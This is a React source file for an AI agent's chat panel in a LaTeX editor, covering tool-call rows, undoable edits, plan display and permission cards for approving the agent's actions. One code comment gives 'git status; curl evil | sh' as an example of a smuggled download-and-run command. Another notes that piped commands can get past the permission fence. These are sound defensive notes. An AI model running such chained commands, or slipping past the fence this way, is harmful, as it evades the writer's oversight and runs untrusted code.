                        data-testid={`mode-${option}`}
                        className={`flex w-full items-start gap-2 rounded-[3px] px-2 py-[6px] text-left transition-colors duration-[90ms] hover:bg-surface-3 ${
                          mode === option ? "bg-surface-3" : ""
                        }`}
                        onClick={() => chooseMode(option)}
                      >
                        {/* The same 4px dot the model popover one icon
                            along the strip uses for its selection. This
                            marked the current position with a fill alone,
                            and two popovers on the same strip saying the
                            same thing two different ways is a difference
                            a reader has to learn rather than read. */}
                        <span
                          className={`mt-[6px] h-[4px] w-[4px] shrink-0 rounded-full ${
                            mode === option ? "bg-pen" : "bg-transparent"
                          }`}
                        />
                        <span className="min-w-0 flex-1">
                        <span
                          className={`t-ui block ${
                            option === "all" ? "text-warn" : "text-ink"
                          }`}
                        >
                          {MODE_TITLES[option]}
                        </span>
                        <span className="t-micro mt-[2px] block text-ink-3">
                          {MODE_NOTES[option]}
                        </span>
                        </span>
                      </button>
                    ))}
                  </div>
                ) : null}
              </div>
            ) : null}
            {/* The third route in. Pasting is how most images will arrive
                and dropping is how the rest will, but neither is how
                everybody works, and a control is also the only thing that
                says the feature exists. */}
            <input
              ref={picker}
              type="file"
              id="nx-attach"
              accept="image/png,image/jpeg,image/webp,image/gif"
              multiple
              hidden
              onChange={(event) => {
                void take(Array.from(event.target.files ?? []));
                event.target.value = "";
              }}
            />
            <button
              className={ICON}
              aria-label="Attach an image"
              title="Attach an image. You can also paste or drop one."
              data-testid="attach"
              onClick={() => picker.current?.click()}
            >
              <Picture />
            </button>
            {/* The two things that most improve the help, kept reachable.
                They used to live only in the welcome message, which
                disappears the moment anything is asked -- so after the
                first question there was no way back to them at all. */}
            <button
              ref={setupButton}
              className={`${ICON} ${setupOpen ? ICON_ON : ""}`}
              data-tone={setupOpen ? "on" : undefined}
              aria-label="Template and voice"
              aria-expanded={setupOpen}
              aria-controls={setupOpen ? "nx-setup" : undefined}
              title="Give the agent a template to follow, or writing of yours to sound like"
              data-testid="setup-open"
              onClick={() => {
                setConfirmClear(false);
                setSetupOpen((open) => {
                  if (!open) {
                    window.setTimeout(
                      () =>
                        setupRef.current
                          ?.querySelector<HTMLElement>("button")
                          ?.focus({ preventScroll: true }),
                      0,
                    );
                  }
                  return !open;
                });
              }}
            >
              <Page />
            </button>
          </div>
          {/* The change announces itself once rather than being
              discovered. A card open used to print nothing here, because
              the box beside it was dead. */}
          <span className="t-micro min-w-0 flex-1 truncate text-ink-3">
            {blocked
              ? queuedCount
                ? "Waiting on your approval · yours will go next"
                : "Waiting on your approval"
              : thinking
                ? queuedCount
                  ? `${name} is working · yours will go next`
                  : ""
                : focusedComposer
                  ? "Enter to send"
                  : ""}
          </span>
          <button
            className={
              draft.trim()
                ? "pen-button h-[28px] shrink-0 px-3 t-ui"
                : "h-[28px] shrink-0 rounded-[3px] border border-line px-3 t-ui text-ink-3"
            }
            disabled={!draft.trim()}
            onClick={send}
          >
            Send
          </button>
        </div>
      </div>
    </div>
  );
}

/** The shared box for a control under the composer: the size, the corner
 *  and the hover, in one place so the four of them cannot drift apart. */
const ICON =
  "quiet flex h-[26px] w-[26px] items-center justify-center rounded-[3px] transition-colors duration-[90ms] hover:bg-surface-3 disabled:opacity-40 disabled:hover:bg-transparent";
const ICON_ON = "bg-surface-3";

/** The shared attributes of the four icons under the composer.  They are
 *  drawn here rather than pulled from an icon set because four of them cost
 *  a few hundred bytes and a library costs tens of kilobytes on a bundle
 *  that is already close to its budget. */
const stroke = {
  width: 13,
  height: 13,
  viewBox: "0 0 13 13",
  fill: "none",
  stroke: "currentColor",
  strokeWidth: 1.3,
  strokeLinecap: "round" as const,
  strokeLinejoin: "round" as const,
};

/** A speech bubble with a plus in it: start another conversation. */
function NewChat() {
  return (
    <svg {...stroke} aria-hidden="true">
      <path d="M11.5 8.2a1 1 0 0 1-1 1H5.2L2.8 11.2V9.2h-.3a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1h8a1 1 0 0 1 1 1z" />
      <path d="M6.5 4.2v2.8M5.1 5.6h2.8" />
    </svg>
  );
}

/** Sliders: which model answers here. */
function Sliders() {
  return (
    <svg {...stroke} aria-hidden="true">
      <path d="M1.8 3.4h9.4M1.8 6.5h9.4M1.8 9.6h9.4" />
      <circle cx="4.3" cy="3.4" r="1.15" />
      <circle cx="8.4" cy="6.5" r="1.15" />
      <circle cx="5.4" cy="9.6" r="1.15" />
    </svg>
  );
}

/** A bolt: the fence is down and nothing stops to ask. */
function Bolt() {
  return (
    <svg {...stroke} aria-hidden="true">
      <path d="M7.4 1.4 3.2 7.2h2.9l-.5 4.4 4.2-5.8H7z" />
    </svg>
  );
}

/** A page: the template to follow and the writing to sound like. */
function Page() {
  return (
    <svg {...stroke} aria-hidden="true">
      <path d="M3 1.6h4.4L10 4.2v7.2H3z" />
      <path d="M7.4 1.6v2.6H10" />
      <path d="M4.6 7h3.8M4.6 9.1h2.6" />
    </svg>
  );
}

/** What the tool did, in the words a writer would use.
 *
 *  `mcp__nexttex__insert_at_cursor` is how the protocol names it; nobody
 *  writing a thesis should have to read that. */

/** A path or a command, cut to something that fits a 32px header beside
 *  the agent's name.  The tail of a path is the part that identifies it. */
function shorten(text: string, limit = 28): string {
  const line = text.split("\n")[0].trim();
  if (line.length <= limit) return line;
  const tail = line.slice(-(limit - 1));
  return line.includes("/") ? `…${tail}` : `${line.slice(0, limit - 1)}…`;
}

/** The three positions, in the writer's terms rather than the fence's.
 *
 *  Named for what happens, not for how much is switched off: "Run the work
 *  without asking" says what the middle position does, where "everything
 *  inside the project" would be a claim the code cannot keep. A piped
 *  command or a script can leave the project without the fence seeing it,
 *  because what the fence inspects is the tool call and not what the
 *  command then does, and section 28 says so where a reader will find it.
 */
const MODE_TITLES: Record<"ask" | "project" | "all", string> = {
  ask: "Ask before acting",
  project: "Run the work without asking",
  all: "Never ask about anything",
};

const MODE_NOTES: Record<"ask" | "project" | "all", string> = {
  ask: "A card for every command, every fetch and every write that leaves this project.",
  project:
    "Commands and edits run silently. Still asked about: writing outside this project, and anything reaching the internet.",
  all: "Nothing is asked about at all. Everything is still recorded here.",
};

/** Tools that are plumbing rather than work: showing them is noise.
 *
 *  `TodoWrite` used to be in here and is not plumbing. It is the model
 *  saying what it intends to do next, and it never reaches this function
 *  now: the store takes it before a tool row is made and turns it into the
 *  turn's plan, replaced in place as later calls revise it. `ToolSearch`
 *  genuinely is plumbing, and stays. */
const HIDDEN_TOOLS = new Set(["ToolSearch"]);


/** A picture, at the weight of the other four icons under the composer.
 *
 *  Hand drawn like the rest of them, for the reason section 19 gives: an
 *  icon set would have been faster and would have cost tens of kilobytes on
 *  a bundle with very little headroom. */
function Picture() {
  return (
    <svg
      width="13"
      height="13"
      viewBox="0 0 16 16"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      aria-hidden="true"
    >
      <rect x="2" y="3.5" width="12" height="9" rx="1.2" />
      <path d="M2.6 11 L6 7.8 L8.4 10" />
      <circle cx="10.4" cy="6.6" r="1.05" />
    </svg>
  );
}

function compact(value: number): string {
  if (!value) return "0";
  if (value < 1000) return String(value);
  if (value < 1_000_000) return `${(value / 1000).toFixed(1)}k`;
  return `${(value / 1_000_000).toFixed(2)}M`;
}

/** One row of the transcript.
 *
 *  Memoised, because the store replaces `chat` on every streamed delta --
 *  twenty times a second -- and without this every row in the conversation
 *  re-rendered on each one.  The items are immutable and keyed by a stable
 *  id, so reference equality is exactly the right test; the two handlers
 *  come from App, which is not re-rendering while a turn streams. */
const Item = memo(function Item({
  item,
  onShowEdit,
  onHoverEdit,
}: {
  item: ChatItem;
  onShowEdit: (path: string, line: number) => void;
  onHoverEdit: (path: string, range: [number, number] | null) => void;
}) {
  if (item.kind === "user") {
    return (
      <div className="flex">
        <span className="w-[3px] shrink-0 bg-line" />
        <div className="ml-3 min-w-0 flex-1">
          <div className="t-ui whitespace-pre-wrap rounded-[3px] bg-surface-2 p-2 text-ink-2">
            {item.text}
          </div>
        </div>
      </div>
    );
  }

  if (item.kind === "claude") {
    return <AgentMessage item={item} />;
  }

  if (item.kind === "tool") {
    // Which tense the row may use. A call whose card is open has not
    // happened, and one the writer refused never will.
    const state: CallState = item.card
      ? item.card.decision === "deny" || item.card.decision === "expired"
        ? "refused"
        : item.card.decision
          ? "done"
          : "asking"
      : "done";
    const answered = item.card?.decision;
    return (
      <div
        className="flex items-baseline gap-2 stream-indent"
        // The account of what was done, on the row the answer belongs to.
        // Folding a decided card into its call is what stops the command
        // being printed twice, and the decision has to come with it: at
        // the quiet positions this row is the only record that the action
        // happened at all.
        data-testid={answered ? `decided-${answered}` : undefined}
      >
        <span
          className={`t-micro ${
            item.ok === false || state === "refused" ? "text-error" : "text-ink-2"
          }`}
        >
          {verbFor(item.name, state)}
        </span>
        <span className="t-code-sm truncate text-ink-3">{item.summary}</span>
        {answered && answered !== "allow" ? (
          <span className="t-micro shrink-0 text-ink-3">
            {decisionWords(answered)}
          </span>
        ) : null}
        {item.repeats && item.repeats > 1 ? (
          <span className="t-micro tabular-nums text-ink-3">×{item.repeats}</span>
        ) : null}
        {/* What it cost, and only once it is worth reading.  A duration on
            every row would be a column of "0.0s" down the transcript;
            half a second is where a reader starts to care, and it turns
            the tool rows from a list of verbs into a record of where a
            turn actually went. */}
        {item.ms != null && item.ms >= 500 ? (
          <span className="t-micro shrink-0 tabular-nums text-ink-3">
            {duration(item.ms)}
          </span>
        ) : null}
      </div>
    );
  }

  // A full stop in the record, not a row. It exists so the replay can tell
  // an interrupted turn from a finished one.
  if (item.kind === "turn_end") return null;

  if (item.kind === "plan") {
    return <Plan item={item} />;
  }

  if (item.kind === "notice") {
    return (
      <div className={`t-meta stream-indent ${item.tone === "error" ? "text-error" : "text-ink-3"}`}>
        {item.text}
      </div>
    );
  }

  if (item.kind === "edit") {
    return <EditChip item={item} onShowEdit={onShowEdit} onHoverEdit={onHoverEdit} />;
  }

  return <Permission item={item} />;
})

/** How long the thing on screen has been going, once that is worth saying.
 *
 *  Not a spinner, and section 6 of the design specification forbids one for
 *  a reason this respects rather than works around: an indicator shown at
 *  0ms on a fast task is what tells the reader the task is slow. So this
 *  appears only after three seconds, which is the same argument as the
 *  compile hairline's 400ms threshold applied to a tool call, and it is a
 *  tabular integer that counts rather than anything that moves. Nothing
 *  goes on the wire for it: one timestamp arrives with the event and the
 *  subtraction happens here.
 *
 *  A reserved minimum width, because the status strip's rule against
 *  reflow applies to any number that changes under the eye, and this one
 *  sits beside a truncating label in a 32px bar.
 */
function Elapsed({
  since,
  parenthesised = false,
}: {
  since: number | null;
  parenthesised?: boolean;
}) {
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    if (since === null) return;
    setNow(Date.now());
    const timer = window.setInterval(() => setNow(Date.now()), 1000);
    return () => window.clearInterval(timer);
  }, [since]);
  if (since === null) return null;
  const seconds = Math.floor((now - since) / 1000);
  if (seconds < 3) return null;
  return (
    <span
      className="t-micro shrink-0 text-right tabular-nums text-ink-3"
      style={{ minWidth: "3ch" }}
    >
      {parenthesised ? "(" : ""}
      {seconds < 60
        ? `${seconds}s`
        : `${Math.floor(seconds / 60)}m${String(seconds % 60).padStart(2, "0")}`}
      {parenthesised ? ")" : ""}
    </span>
  );
}

/** The model's plan for this turn.
 *
 *  `TodoWrite` was in `HIDDEN_TOOLS` as plumbing, so the one thing the
 *  agent writes to say what it intends to do next arrived on the wire and
 *  was thrown away. It is the clearest answer anybody has found to "what is
 *  this thing doing for the next minute", and it costs nothing to show
 *  because the data was already here.
 *
 *  Drawn as rows rather than a card: a 3px stripe per item, `--ok` for what
 *  is done, `--pen` for the one in hand and `--line` for what is still to
 *  come, which is the same vocabulary the transcript already uses for a
 *  message and a gate. No checkbox glyphs, because they invite a click that
 *  does nothing.
 */
function Plan({ item }: { item: Extract<ChatItem, { kind: "plan" }> }) {
  const done = item.items.filter((entry) => entry.state === "done").length;
  return (
    <div className="stream-indent">
      <div className="flex items-baseline gap-2">
        <span className="t-micro text-ink-2">Plan</span>
        <span className="t-micro tabular-nums text-ink-3">
          {done} of {item.items.length}
        </span>
      </div>
      <div className="mt-1 flex flex-col gap-[2px]">
        {item.items.map((entry, index) => (
          <div key={index} className="flex items-start gap-2">
            <span
              className={`mt-[6px] h-[3px] w-[10px] shrink-0 ${
                entry.state === "done"
                  ? "bg-ok"
                  : entry.state === "active"
                    ? "bg-pen"
                    : "bg-line"
              }`}
            />
            <span
              className={`t-meta min-w-0 ${
                entry.state === "done"
                  ? "text-ink-3 line-through"
                  : entry.state === "active"
                    ? "text-ink"
                    : "text-ink-2"
              }`}
            >
              {entry.text}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

/** A duration a person reads, not a number of milliseconds.
 *
 *  Sans with tabular figures rather than mono: the mono rule is for a
 *  literal string the machine produced or consumes, and an elapsed time is
 *  numeric metadata. */
export function duration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60_000) return `${(ms / 1000).toFixed(1)}s`;
  const minutes = Math.floor(ms / 60_000);
  return `${minutes}m ${Math.round((ms % 60_000) / 1000)}s`;
}

function AgentMessage({ item }: { item: Extract<ChatItem, { kind: "claude" }> }) {
  const name = agentName(useStore((s) => s.agent?.provider));
  // The caret is solid while tokens are arriving and blinks once they stop,
  // so a paused generation looks different from a finished one.
  const [paused, setPaused] = useState(false);
  useEffect(() => {
    if (!item.streaming) return;
    setPaused(false);
    const timer = window.setTimeout(() => setPaused(true), 900);
    return () => window.clearTimeout(timer);
  }, [item.text, item.streaming]);

  const [hover, setHover] = useState(false);

  return (
    <div
      className="flex"
      tabIndex={0}
      onMouseEnter={() => setHover(true)}
      onMouseLeave={() => setHover(false)}
      onFocus={() => setHover(true)}
      onBlur={() => setHover(false)}
    >
      <span className="w-[3px] shrink-0 bg-pen" />
      <div className="ml-3 min-w-0 flex-1">
        <div className="flex items-baseline justify-between">
          <span className="t-micro text-pen">{name}</span>
          {hover ? (
            <span className="t-micro tnum text-ink-3">
              {new Date(item.at).toLocaleTimeString([], {
                hour: "2-digit",
                minute: "2-digit",
              })}
            </span>
          ) : null}
        </div>
        <div className="t-prose text-ink">
          <Prose text={item.text} />
          {item.streaming ? (
            <span
              className={`ml-[1px] inline-block h-[1.1em] w-[2px] translate-y-[2px] bg-pen ${
                paused ? "caret-paused" : ""
              }`}
            />
          ) : null}
        </div>
      </div>
    </div>
  );
}

function EditChip({
  item,
  onShowEdit,
  onHoverEdit,
}: {
  item: Extract<ChatItem, { kind: "edit" }>;
  onShowEdit: (path: string, line: number) => void;
  onHoverEdit: (path: string, range: [number, number] | null) => void;
}) {
  const [open, setOpen] = useState(false);
  const [undoable, setUndoable] = useState(true);
  const name = item.path.split("/").pop() ?? item.path;

  const patch = useMemo(
    () =>
      open
        ? createTwoFilesPatch(name, name, item.before, item.after, "", "", {
            context: 2,
          })
        : "",
    [open, item.before, item.after, name],
  );

  const changedLine = useMemo(
    () => firstChangedLine(item.before, item.after),
    [item.before, item.after],
  );

  if (item.state === "reverted") {
    return <Reverted item={item} name={name} />;
  }

  return (
    <div className="stream-indent" data-testid="edit-chip">
      <div
        className="flex h-[24px] w-fit max-w-full items-center gap-2 rounded-[3px] bg-pen-wash px-2"
        onMouseEnter={() => onHoverEdit(item.path, [changedLine, changedLine + 2])}
        onMouseLeave={() => onHoverEdit(item.path, null)}
      >
        <button
          className="flex min-w-0 items-center gap-1 text-ink"
          aria-expanded={open}
          onClick={() => setOpen(!open)}
        >
          <span className={open ? "rotate-180" : ""}>
            <Chevron direction="down" />
          </span>
          <span className="t-code-sm truncate">{name}</span>
        </button>
        <span className="t-micro tnum shrink-0">
          <span className="text-ok">+{item.added}</span>{" "}
          <span className="text-error">−{item.removed}</span>
        </span>
        <span className="flex shrink-0 gap-2">
          <button
            className="quiet t-micro"
            onClick={() => onShowEdit(item.path, changedLine)}
          >
            Show
          </button>
          {undoable ? (
            <button
              className="quiet t-micro"
              onClick={async () => {
                const projectId = get().projectId;
                if (!projectId) return;
                const result = await api.undo(
                  projectId,
                  item.path,
                  item.before,
                  item.after,
                  item.id,
                );
                if (result.ok) markReverted(item.id);
                else setUndoable(false);
              }}
            >
              Undo
            </button>
          ) : (
            <span className="t-micro text-ink-3">Can’t undo, you edited this</span>
          )}
        </span>
      </div>
      {open ? (
        <pre className="t-code-sm mt-1 max-h-[220px] overflow-auto whitespace-pre rounded-[3px] border-l border-line bg-surface-2 p-2">
          {patch
            .split("\n")
            .slice(4)
            .map((line, index) => (
              <div
                key={index}
                className={
                  line.startsWith("+")
                    ? "bg-[color-mix(in_oklab,var(--ok)_10%,transparent)]"
                    : line.startsWith("-")
                      ? "bg-[color-mix(in_oklab,var(--error)_10%,transparent)]"
                      : ""
                }
              >
                {line}
              </div>
            ))}
        </pre>
      ) : null}
    </div>
  );
}

function Reverted({
  item,
  name,
}: {
  item: Extract<ChatItem, { kind: "edit" }>;
  name: string;
}) {
  // Redo stays live for ten seconds.  After that the reverted line remains
  // in the transcript for good: the chat is the record of what was done to
  // the document, and nothing in it disappears.
  const [canRedo, setCanRedo] = useState(true);
  useEffect(() => {
    const timer = window.setTimeout(() => setCanRedo(false), 10000);
    return () => window.clearTimeout(timer);
  }, []);

  return (
    <div className="flex h-[20px] items-center gap-3 stream-indent">
      <span className="t-micro text-ink-3 line-through">Reverted: {name}</span>
      {canRedo ? (
        <button
          className="t-micro text-ink-2 hover:text-ink"
          onClick={async () => {
            const projectId = get().projectId;
            if (!projectId) return;
            const result = await api.undo(
              projectId, item.path, item.after, item.before, item.id, "live",
            );
            if (result.ok) markLive(item.id);
            else setCanRedo(false);
          }}
        >
          Redo
        </button>
      ) : null}
    </div>
  );
}

function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> }) {
  const [armed, setArmed] = useState(false);

  // 350ms input shield: a card that appears under a cursor already moving
  // toward the composer must not be approvable on the way past.  The
  // buttons are really disabled for that moment rather than silently
  // ignoring the click -- a control that looks live and does nothing reads
  // as a broken app, and this one guards the fence.
  useEffect(() => {
    const timer = window.setTimeout(() => setArmed(true), 350);
    return () => window.clearTimeout(timer);
  }, []);

  const decide = async (
    decision: "allow" | "always" | "conversation" | "deny",
  ) => {
    if (!armed) return;
    const projectId = get().projectId;
    if (!projectId) return;
    resolvePermission(item.id, decision);
    try {
      await api.respond(projectId, item.id, decision);
    } catch (error: any) {
      set({ error: error.message });
    }
  };

  // The hotkeys belong to the card, not the window.  CodeMirror's content is
  // a contenteditable div, so a window-level handler that only excludes
  // inputs would let ordinary typing in the editor answer the card.
  const card = useRef<HTMLDivElement | null>(null);
  // Which of the two remembering answers is under the cursor, so the
  // line can say what that one remembers.  They remember the same rule
  // for different lengths of time, and the difference is the whole
  // reason there are two of them.
  const [scope, setScope] = useState<"" | "always" | "conversation">("");
  const [focused, setFocused] = useState(false);
  useEffect(() => {
    if (item.decision) return;
    const timer = window.setTimeout(() => {
      // Only take focus if nothing is being typed into.  Pulling the caret
      // out of the editor mid-sentence would make the writer's next "a" or
      // "d" answer a card they have not read -- which is the exact thing
      // the 350 ms shield exists to prevent.
      const active = document.activeElement as HTMLElement | null;
      const typing =
        active?.closest(".cm-editor") ||
        active?.tagName === "TEXTAREA" ||
        active?.tagName === "INPUT";
      // `preventScroll`, because the panel has its own idea of where it
      // should be: the pin-to-bottom effect runs on every change, and a
      // focus that also scrolls means two authorities moving the same
      // container in one frame, which the reader sees as a jump.
      if (!typing) card.current?.focus({ preventScroll: true });
    }, 350);
    return () => window.clearTimeout(timer);
  }, [item.decision]);

  if (item.decision) {
    // Three states, not two.  An action nobody was asked about is not the
    // same as one the writer allowed, and the record should not read as
    // though they had.  The dot is --warn, the permission card's own
    // colour, so the association is already built.
    // Four states, not three. An action nobody was asked about is not the
    // same as one the writer allowed, and an answer that lasts as long as
    // this conversation is not the same as a rule they set for good: the
    // record has to be able to say which, because the last of those is the
    // one they will go looking for in their settings later.
    const label = decisionWords(item.decision);
    const dot =
      item.decision === "deny"
        ? "bg-ink-3"
        : item.decision === "auto"
          ? "bg-warn"
          : "bg-ok";
    return (
      <div
        className="flex h-[26px] items-center gap-2 stream-indent"
        data-testid={`decided-${item.decision}`}
      >
        <span className={`h-[6px] w-[6px] rounded-full ${dot}`} />
        {/* Separated by space rather than by punctuation, which is the
            status strip's own rule. The separator here used to be a dash,
            the sweep made it a comma, and a comma before a monospaced run
            has visibly less air than the dash had: `Denied, latexmk -C`
            read as one word. Space is the right answer and was all along. */}
        <span className="t-micro shrink-0 text-ink-3">
          {label}
          {item.repeats && item.repeats > 1 ? (
            <span className="tabular-nums"> ×{item.repeats}</span>
          ) : null}
        </span>
        <span className="t-micro min-w-0 truncate text-ink-3">
          {item.detail ? (
            <span className="t-code-sm">{item.detail}</span>
          ) : (
            item.headline
          )}
        </span>
      </div>
    );
  }

  return (
    <div
      ref={card}
      data-testid="permission-card"
      tabIndex={0}
      role="group"
      aria-label={item.headline}
      // No focus ring: the global one is --pen, and a violet perimeter on a
      // card whose whole point is a --warn gate says "Claude is talking" at
      // the moment it should say "this needs an answer".
      className="stream-indent permission-card flex rounded-[5px] border border-line bg-surface-2"
      style={{ animation: "permission-in 90ms var(--ease)" }}
      onFocus={() => setFocused(true)}
      onBlur={(event) => {
        if (!event.currentTarget.contains(event.relatedTarget as Node)) {
          setFocused(false);
        }
      }}
      onKeyDown={(event) => {
        if (event.key === "a" && !event.shiftKey) decide("allow");
        if (event.key === "A" && event.shiftKey && item.rule) decide("always");
        if ((event.key === "c" || event.key === "C") && item.rule) {
          decide("conversation");
        }
        if (event.key === "d") decide("deny");
      }}
    >
      <span className="w-[3px] shrink-0 rounded-l-[5px] bg-warn" />
      <div className="min-w-0 flex-1 p-3">
        <div className="t-ui text-ink">{item.headline}</div>
        {item.detail ? (
          <pre className="t-code-sm mt-2 max-h-[108px] overflow-auto whitespace-pre-wrap rounded-[3px] bg-surface p-2">
            {item.detail}
          </pre>
        ) : null}
        {item.consequence ? (
          <div className="t-meta mt-2 text-ink-2">{item.consequence}</div>
        ) : null}
        {/* Why this one stopped, which only has an answer worth reading when
            auto mode is on and something held the call back regardless.
            With the switch off the answer is that this app asks before it
            acts, and printing that on every card is how people learn to stop
            reading them. */}
        {item.reason ? (
          <div className="t-micro mt-2 text-ink-3">{item.reason}</div>
        ) : null}
        {item.rule ? (
          // Always in the layout, only sometimes visible.  Adding this line
          // on hover grew the card and moved the buttons out from under the
          // cursor that was reaching for them -- and moving away shrank it
          // again, so the pointer oscillated between the two.
          <div
            className={`t-micro mt-2 truncate text-ink-3 transition-opacity duration-[90ms] ${
              scope ? "opacity-100" : "opacity-0"
            }`}
            // Shortened from the front, never the end.  A rule scoped to a
            // file is an absolute path, and the half a 320px panel can show
            // is the half that says nothing -- the filename is the part the
            // writer is agreeing to.  The whole rule is in the tooltip.
            title={item.rule}
            aria-hidden={!scope}
            data-testid="scope-line"
          >
            {scope === "conversation" ? "Until this conversation is cleared: " : "Remembers: "}
            {shortRule(item.rule)}
          </div>
        ) : null}
        {/* `flex-wrap` and `whitespace-nowrap` together, because the panel
            is resizable and the interface text size goes to 135 per cent: a
            label that wraps to two lines inside a box pinned at 28px spills
            out of it, and a row that cannot wrap pushes Deny past the edge
            of the card.  The row gives way now, not the buttons. */}
        <div className="mt-3 flex flex-wrap items-center gap-[6px]">
          <button
            className="h-[28px] shrink-0 whitespace-nowrap pen-button px-3 t-ui"
            data-testid="allow"
            disabled={!armed}
            onClick={() => decide("allow")}
          >
            Allow
            <span className={`t-micro ${focused ? "opacity-70" : "opacity-0"}`}>
              {" "}
              A
            </span>
          </button>
          {/* The answer the two remaining gates actually needed. Both of
              the things the middle position still asks about are things a
              turn asks about repeatedly: a run that adds eleven references
              put up eleven identical cards, and neither existing answer
              fitted, since Allow was too little and Allow always was a
              permanent grant nobody wanted to make for one afternoon's
              reading. It is remembered nowhere: a set on the object, gone
              with the conversation and gone with the process. */}
          {item.rule ? (
            <button
              className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui disabled:opacity-40"
              data-testid="conversation"
              disabled={!armed}
              onMouseEnter={() => setScope("conversation")}
              onMouseLeave={() => setScope("")}
              onFocus={() => setScope("conversation")}
              onBlur={() => setScope("")}
              onClick={() => decide("conversation")}
            >
              For this conversation
              <span className={`t-micro ${focused ? "text-ink-3" : "opacity-0"}`}>
                {" "}
                C
              </span>
            </button>
          ) : null}
          {/* A command carrying shell syntax is remembered by its exact
              text rather than by its first word, because a rule on the word
              would be a promise the fence cannot keep: `Bash:git` would
              cover `git status; curl evil | sh`.  So the button is offered
              here now, and what it remembers is exactly this command. */}
          {item.rule ? (
            <button
              className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui disabled:opacity-40"
              data-testid="always"
              disabled={!armed}
              onMouseEnter={() => setScope("always")}
              onMouseLeave={() => setScope("")}
              onFocus={() => setScope("always")}
              onBlur={() => setScope("")}
              onClick={() => decide("always")}
            >
              Allow always
              <span className={`t-micro ${focused ? "text-ink-3" : "opacity-0"}`}>
                {" "}
                ⇧A
              </span>
            </button>
          ) : null}
          <button
            className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui text-ink-2 hover:border-error hover:text-error disabled:opacity-40"
            data-testid="deny"
            disabled={!armed}
            onClick={() => decide("deny")}
          >
            Deny
            <span className={`t-micro ${focused ? "text-ink-3" : "opacity-0"}`}>
              {" "}
              D
            </span>
          </button>
        </div>
      </div>
    </div>
  );
}
